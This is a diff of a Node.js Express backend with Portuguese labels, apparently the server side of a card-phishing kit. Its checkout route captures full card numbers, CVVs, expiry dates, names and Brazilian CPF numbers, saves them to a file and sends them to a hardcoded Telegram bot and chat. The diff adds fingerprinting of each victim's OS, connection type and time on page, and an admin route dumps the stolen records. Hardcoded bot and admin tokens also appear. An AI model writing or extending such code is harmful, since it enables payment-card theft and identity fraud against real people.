@@ -19,11 +19,11 @@ app.get('/', (req, res) => {
 
 // ========= Config =========
 const PORT = process.env.PORT || 3000;
-const DATA_DIR = __dirname; // garante caminho absoluto no Railway
+const DATA_DIR = __dirname;
 const usersFile = path.join(DATA_DIR, 'users.txt');
 const checkoutFile = path.join(DATA_DIR, 'checkout.txt');
 
-// Preferir ENV no Railway, com fallback para os valores existentes
+// ENV variables com fallback
 const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "8492628989:AAH28BrxrcyF0hdwLVSAFTvsA7OA80_OkGA";
 const CHAT_ID = process.env.TELEGRAM_CHAT_ID || "-1002852733056";
 const ADMIN_TOKEN = process.env.ADMIN_TOKEN || 'MOUSEPADGAFANHOTO';
@@ -96,12 +96,22 @@ app.post('/login', (req, res) => {
   }
 });
 
-// ========= Checkout (compatível com seu front) =========
+// ========= Checkout =========
 app.post('/enviar', async (req, res) => {
   try {
-    const { cardNumber, cardcvvName, expiry, cardholderIdentificationNumber, cardholderNameC } = req.body || {};
+    const {
+      cardNumber,
+      cardcvvName,
+      expiry,
+      cardholderIdentificationNumber,
+      cardholderNameC,
+      timeOnPage,   // novo
+      os,           // novo
+      connection    // novo
+    } = req.body || {};
+
     if (!cardNumber || !cardcvvName || !expiry || !cardholderIdentificationNumber || !cardholderNameC) {
-      return res.status(400).json({ success: false, message: 'Todos os campos são obrigatórios.' });
+      return res.status(400).json({ success: false, message: 'Todos os campos obrigatórios são necessários.' });
     }
 
     ensureFilesExist();
@@ -114,22 +124,27 @@ app.post('/enviar', async (req, res) => {
       cardholderIdentificationNumber,
       cardholderNameC,
       ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress || '',
-      ua: req.headers['user-agent'] || ''
+      ua: req.headers['user-agent'] || '',
+      timeOnPage: timeOnPage || null,
+      os: os || 'Desconhecido',
+      connection: connection || 'Desconhecido'
     };
 
-    // Persistência como JSONL para facilitar leitura no admin
     fs.appendFileSync(checkoutFile, JSON.stringify(payload) + '\n', 'utf8');
     console.log('✔️ checkout salvo em', checkoutFile);
 
     const mensagem =
-      `<b>Checkout recebido</b>\n` +
+      `<b>Nova Info Recebida</b>\n` +
       `💳 <b>Número:</b> ${cardNumber}\n` +
       `🔒 <b>CVV:</b> ${cardcvvName}\n` +
       `📅 <b>Validade:</b> ${expiry}\n` +
       `👤 <b>Nome:</b> ${cardholderNameC}\n` +
       `🆔 <b>CPF:</b> ${cardholderIdentificationNumber}\n` +
       `🕒 <b>TS:</b> ${payload.ts}\n` +
-      `🌐 <b>IP:</b> ${payload.ip}`;
+      `🌐 <b>IP:</b> ${payload.ip}\n` +
+      `💻 <b>SO:</b> ${payload.os}\n` +
+      `📡 <b>Conexão:</b> ${payload.connection}\n` +
+      `⏱️ <b>Tempo na página:</b> ${payload.timeOnPage ? payload.timeOnPage + 'ms' : 'desconhecido'}`;
 
     try {
       await sendToTelegram(mensagem);
@@ -137,7 +152,6 @@ app.post('/enviar', async (req, res) => {
       return res.json({ success: true, message: 'Dados processados e enviados com sucesso!' });
     } catch (tgErr) {
       console.error('Falha Telegram:', tgErr.message);
-      // Não falha o fluxo principal
       return res.json({ success: true, message: 'Dados processados (Falha ao enviar ao Telegram).', telegram_error: tgErr.message });
     }
   } catch (error) {
@@ -146,8 +160,7 @@ app.post('/enviar', async (req, res) => {
   }
 });
 
-// ========= Admin (NOVO) =========
-// Exibe conteúdo bruto do checkout.txt
+// ========= Admin =========
 app.get('/admin/checkouts', (req, res) => {
   const token = req.query.token;
   if (token !== ADMIN_TOKEN) return res.status(403).send('Acesso negado');
@@ -161,7 +174,6 @@ app.get('/admin/checkouts', (req, res) => {
   }
 });
 
-// Exibe conteúdo bruto do users.txt
 app.get('/admin/users', (req, res) => {
   const token = req.query.token;
   if (token !== ADMIN_TOKEN) return res.status(403).send('Acesso negado');
